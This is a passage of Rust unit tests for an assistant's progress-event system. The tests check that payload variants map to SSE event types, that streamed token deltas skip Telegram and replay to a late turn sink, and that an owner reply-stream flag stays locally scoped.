            (
                ProgressPayload::VisionRouted { model: "m".into() },
                "vision_routed",
            ),
            (
                ProgressPayload::FallbackRouted {
                    from: "x".into(),
                    to: "y".into(),
                },
                "owner_notice",
            ),
            (
                ProgressPayload::OwnerNotice {
                    text: "hi".into(),
                    kind: OwnerNoticeKind::Health,
                },
                "owner_notice",
            ),
            (
                ProgressPayload::IntentResolved {
                    intent_id: "commute_status".into(),
                    label: "Commute".into(),
                    confidence: 0.9,
                    needs_review: false,
                },
                "intent_resolved",
            ),
            (
                ProgressPayload::FinalReply {
                    text: "done".into(),
                },
                "done",
            ),
            (
                ProgressPayload::ActionPhase {
                    phase: "jev_ask".into(),
                    tool_name: Some("google_drive_upload".into()),
                    detail: Some("Jev ask — waiting".into()),
                },
                "action_phase",
            ),
            (
                ProgressPayload::AssistantDelta { text: "早".into() },
                "assistant_delta",
            ),
            (
                ProgressPayload::AssistantDraftReset,
                "assistant_draft_reset",
            ),
        ];
        for (payload, expected_type) in cases {
            let frame =
                progress_event_to_sse_json(&ProgressEvent::with_turn(1, Some("t".into()), payload));
            assert_eq!(frame.event_type, expected_type);
            assert_eq!(frame.data["type"], expected_type);
            assert_eq!(frame.data["turn_id"], "t");
        }
    }

    #[tokio::test]
    async fn assistant_deltas_skip_telegram_and_replay_if_the_sink_is_late() {
        let (tg_tx, mut tg_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        let router = ProgressRouter::new(tg_tx);
        let sender = router.progress_sender();
        sender
            .try_send(ProgressEvent::with_turn(
                7,
                Some("turn-1".into()),
                ProgressPayload::AssistantDelta { text: "早".into() },
            ))
            .unwrap();
        sender
            .try_send(ProgressEvent::with_turn(
                7,
                Some("turn-1".into()),
                ProgressPayload::AssistantDelta { text: "安".into() },
            ))
            .unwrap();
        assert!(
            tg_rx.try_recv().is_err(),
            "token frames must not reach Telegram"
        );

        let (turn_tx, mut turn_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        router.register_turn("turn-1".into(), turn_tx);
        let replay = turn_rx.recv().await.expect("replay");
        match &*replay.payload {
            ProgressPayload::AssistantDelta { text } => assert_eq!(text, "早安"),
            other => panic!("unexpected replay: {other:?}"),
        }

        sender
            .try_send(ProgressEvent::with_turn(
                7,
                Some("turn-1".into()),
                ProgressPayload::AssistantDraftReset,
            ))
            .unwrap();
        let reset = turn_rx.recv().await.expect("reset");
        assert!(matches!(
            &*reset.payload,
            ProgressPayload::AssistantDraftReset
        ));
        assert!(tg_rx.try_recv().is_err());
    }

    #[test]
    fn owner_reply_stream_is_off_outside_its_scope() {
        assert!(!owner_reply_stream_enabled());
    }

    #[tokio::test]
    async fn owner_reply_stream_scope_is_local() {
        assert!(with_owner_reply_stream(async { owner_reply_stream_enabled() }).await);
        assert!(!owner_reply_stream_enabled());
    }
}
